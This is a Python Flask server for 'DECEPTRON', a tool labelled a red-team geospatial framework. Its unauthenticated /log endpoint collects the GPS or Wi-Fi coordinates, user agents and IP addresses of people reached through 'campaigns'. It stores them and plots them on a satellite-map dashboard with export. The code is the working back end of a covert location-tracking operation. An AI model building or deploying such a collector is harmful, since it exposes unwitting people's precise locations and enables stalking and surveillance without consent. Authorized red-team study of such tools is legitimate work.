#!/usr/bin/env python3
"""
DECEPTRON — Collector & Dashboard Server
Created by: anonymous-beta | https://github.com/anonymous-beta
"""

import os, json, sqlite3, uuid
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string, send_file
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

CONFIG_PATH = "config.json"
config = json.load(open(CONFIG_PATH)) if os.path.exists(CONFIG_PATH) else {}
DB_PATH = config.get("db_path", "db/hits.db")
MAP_TILE = config.get("map_tile_url", "https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}")

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

@app.route("/")
def dashboard():
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) as total FROM hits")
    total = c.fetchone()["total"]
    c.execute("SELECT COUNT(DISTINCT session_id) as sessions FROM hits")
    sessions = c.fetchone()["sessions"]
    c.execute("SELECT MAX(timestamp) as last FROM hits")
    last = c.fetchone()["last"]
    conn.close()
    
    last_str = "Never"
    if last:
        last_str = datetime.fromtimestamp(last).strftime("%Y-%m-%d %H:%M:%S")

    html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>DECEPTRON | Dashboard</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; }}
        body {{ background:#0a0a0f; color:#e0e0e0; font-family:'Segoe UI',system-ui,sans-serif; overflow:hidden; }}
        #header {{
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            padding: 1rem 2rem;
            border-bottom: 1px solid #2a2a40;
            display: flex; justify-content: space-between; align-items: center;
        }}
        #header h1 {{
            font-size: 1.4rem; letter-spacing: 2px;
            background: linear-gradient(90deg, #00d4ff, #7b2cbf);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }}
        #header .meta {{ font-size: 0.85rem; color: #888; }}
        #controls {{
            position: absolute; top: 70px; left: 0; right: 0;
            background: rgba(10,10,15,0.95);
            padding: 0.6rem 2rem;
            border-bottom: 1px solid #2a2a40;
            display: flex; gap: 1rem; align-items: center; z-index: 1000;
        }}
        #controls select, #controls button {{
            background: #1a1a2e; color: #e0e0e0;
            border: 1px solid #2a2a40; border-radius: 4px;
            padding: 0.4rem 0.8rem; font-size: 0.85rem; cursor: pointer;
        }}
        #controls button:hover {{ background: #2a2a40; }}
        #map {{ position: absolute; top: 120px; left: 0; right: 0; bottom: 0; z-index: 1; }}
        .leaflet-popup-content-wrapper {{
            background: rgba(20,20,30,0.95);
            color: #e0e0e0; border: 1px solid #2a2a40; border-radius: 8px;
        }}
        .leaflet-popup-tip {{ background: rgba(20,20,30,0.95); }}
        #stats {{
            position: absolute; bottom: 20px; right: 20px;
            background: rgba(10,10,15,0.9);
            border: 1px solid #2a2a40; border-radius: 8px;
            padding: 1rem; z-index: 1000; font-size: 0.85rem;
        }}
        #stats span {{ color: #00d4ff; font-weight: bold; }}
        .pulse {{
            animation: pulse 2s infinite;
        }}
        @keyframes pulse {{
            0% {{ opacity: 1; }}
            50% {{ opacity: 0.5; }}
            100% {{ opacity: 1; }}
        }}
    </style>
</head>
<body>
    <div id="header">
        <div>
            <h1>DECEPTRON</h1>
            <div class="meta">Red Team Geospatial Intelligence Framework</div>
        </div>
        <div class="meta">anonymous-beta | github.com/anonymous-beta</div>
    </div>
    
    <div id="controls">
        <select id="campaignFilter" onchange="filterCampaign()">
            <option value="all">All Campaigns</option>
        </select>
        <button onclick="refreshData()">↻ Refresh</button>
        <button onclick="exportData('json')">⬇ JSON</button>
        <button onclick="exportData('csv')">⬇ CSV</button>
    </div>
    
    <div id="map"></div>
    
    <div id="stats">
        Hits: <span id="statHits">{total}</span> | 
        Sessions: <span id="statSessions">{sessions}</span> | 
        Last: <span id="statLast">{last_str}</span>
    </div>

    <script>
        const map = L.map('map').setView([20, 0], 2);
        L.tileLayer('{MAP_TILE}', {{
            attribution: 'ESRI Satellite',
            maxZoom: 18
        }}).addTo(map);

        let markers = [];
        let allData = [];

        function getColor(source) {{
            if(source === 'gps') return '#00ff88';
            if(source === 'wifi') return '#ffcc00';
            return '#ff3366';
        }}

        function renderMarkers(data) {{
            markers.forEach(m => map.removeLayer(m));
            markers = [];
            
            data.forEach(hit => {{
                const color = getColor(hit.source);
                const circle = L.circleMarker([hit.lat, hit.lng], {{
                    radius: 8,
                    fillColor: color,
                    color: '#fff',
                    weight: 2,
                    opacity: 1,
                    fillOpacity: 0.8
                }}).addTo(map);
                
                const time = new Date(hit.ts * 1000).toLocaleString();
                circle.bindPopup(`
                    <b>Campaign:</b> ${{hit.campaign_id}}<br>
                    <b>Session:</b> ${{hit.session_id}}<br>
                    <b>Lat:</b> ${{hit.lat.toFixed(5)}}<br>
                    <b>Lng:</b> ${{hit.lng.toFixed(5)}}<br>
                    <b>Accuracy:</b> ${{hit.acc}}m<br>
                    <b>Source:</b> ${{hit.source}}<br>
                    <b>UA:</b> ${{hit.ua.substring(0,60)}}...<br>
                    <b>Time:</b> ${{time}}
                `);
                markers.push(circle);
            }});
        }}

        async function loadData() {{
            const resp = await fetch('/data');
            allData = await resp.json();
            
            const campaigns = [...new Set(allData.map(d => d.campaign_id))];
            const sel = document.getElementById('campaignFilter');
            const current = sel.value;
            sel.innerHTML = '<option value=\"all\">All Campaigns</option>';
            campaigns.forEach(c => {{
                const opt = document.createElement('option');
                opt.value = c; opt.textContent = c;
                sel.appendChild(opt);
            }});
            if(campaigns.includes(current)) sel.value = current;
            
            filterCampaign();
            updateStats();
        }}

        function filterCampaign() {{
            const c = document.getElementById('campaignFilter').value;
            const filtered = c === 'all' ? allData : allData.filter(d => d.campaign_id === c);
            renderMarkers(filtered);
        }}

        function updateStats() {{
            document.getElementById('statHits').textContent = allData.length;
            document.getElementById('statSessions').textContent = [...new Set(allData.map(d => d.session_id))].length;
        }}

        function refreshData() {{
            loadData();
        }}

        function exportData(fmt) {{
            window.location.href = '/export/' + fmt;
        }}

        // Auto refresh every 10s
        setInterval(loadData, 10000);
        loadData();
    </script>
</body>
</html>
    """
    return render_template_string(html)

@app.route("/log", methods=["POST"])
def collector():
    data = request.get_json(force=True)
    campaign_id = data.get("id", "unknown")
    session_id = data.get("session", uuid.uuid4().hex[:8])
    lat = float(data.get("lat", 0))
    lng = float(data.get("lng", 0))
    acc = float(data.get("acc", 99999))
    ua = data.get("ua", "")
    ts = int(data.get("ts", 0))
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    source = data.get("source", "unknown")

    conn = get_db()
    c = conn.cursor()
    c.execute("""
        INSERT INTO hits (campaign_id, session_id, latitude, longitude, accuracy, user_agent, ip, timestamp, source)
        VALUES (?,?,?,?,?,?,?,?,?)
    """, (campaign_id, session_id, lat, lng, acc, ua, ip, ts, source))
    
    # Update sessions
    c.execute("SELECT * FROM sessions WHERE id=?", (session_id,))
    row = c.fetchone()
    now = int(datetime.now().timestamp())
    if row:
        c.execute("UPDATE sessions SET last_seen=?, hit_count=hit_count+1 WHERE id=?", (now, session_id))
    else:
        c.execute("INSERT INTO sessions (id, campaign_id, first_seen, last_seen, hit_count) VALUES (?,?,?,?,1)",
                  (session_id, campaign_id, now, now))
    
    conn.commit()
    conn.close()
    return jsonify({"status": "ok"})

@app.route("/data")
def data_all():
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT campaign_id, session_id, latitude as lat, longitude as lng, accuracy as acc, user_agent as ua, timestamp as ts, source FROM hits ORDER BY timestamp DESC")
    rows = [dict(r) for r in c.fetchall()]
    conn.close()
    return jsonify(rows)

@app.route("/data/<campaign>")
def data_campaign(campaign):
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT campaign_id, session_id, latitude as lat, longitude as lng, accuracy as acc, user_agent as ua, timestamp as ts, source FROM hits WHERE campaign_id=? ORDER BY timestamp DESC", (campaign,))
    rows = [dict(r) for r in c.fetchall()]
    conn.close()
    return jsonify(rows)

@app.route("/export/json")
def export_json():
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM hits")
    rows = [dict(r) for r in c.fetchall()]
    conn.close()
    return jsonify(rows)

@app.route("/export/csv")
def export_csv():
    import csv, io
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT * FROM hits")
    rows = c.fetchall()
    cols = [d[0] for d in c.description]
    conn.close()
    
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(cols)
    writer.writerows(rows)
    output.seek(0)
    return send_file(io.BytesIO(output.getvalue().encode()), mimetype="text/csv", as_attachment=True, download_name="deceptron_export.csv")

if __name__ == "__main__":
    host = config.get("server_host", "0.0.0.0")
    port = config.get("server_port", 5000)
    print(f"[+] DECEPTRON Collector + Dashboard")
    print(f"[+] Created by: anonymous-beta | https://github.com/anonymous-beta")
    print(f"[+] Listening on {host}:{port}")
    app.run(host=host, port=port, debug=False)
